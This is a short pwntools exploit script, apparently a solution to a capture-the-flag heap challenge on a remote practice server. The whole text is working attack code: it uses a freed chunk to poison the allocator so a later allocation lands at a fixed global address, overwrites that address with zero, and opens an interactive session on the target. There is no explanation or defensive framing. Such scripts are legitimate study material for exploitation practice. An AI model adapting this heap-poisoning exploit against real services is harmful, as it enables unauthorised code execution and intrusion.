from pwn import *
context.log_level = 'debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 28773)
elf = ELF('./pwn')

sla = lambda x, y: io.sendlineafter(x, y)

def add(size):
	sla(b'choice>\n', b'1')
	sla(b'size>\n', str(size).encode())

def delete(index):
	sla(b'choice>\n', b'2')
	sla(b'index>\n', str(index).encode())

def writein(index, content):
	sla(b'choice>\n', b'3')
	sla(b'index>\n', str(index).encode())
	time.sleep(0.1)
	io.send(content)

add(0x40)
delete(0)
writein(0, p64(0x602080))
add(0x40)
add(0x40)
writein(2, p64(0))
sla(b'choice>\n', b'4')
io.interactive()
